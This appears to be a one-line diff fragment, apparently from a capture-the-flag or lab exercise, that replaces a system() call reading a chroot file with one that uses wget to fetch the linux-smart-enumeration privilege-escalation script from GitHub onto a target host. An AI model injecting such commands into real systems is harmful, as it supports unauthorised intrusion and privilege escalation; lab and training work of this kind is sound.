@@ -1,1 +1,1 @@
-<pre>system('man cat /etc/debian_chroot')</pre>
+<pre>system('wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh -O lse.sh')</pre>
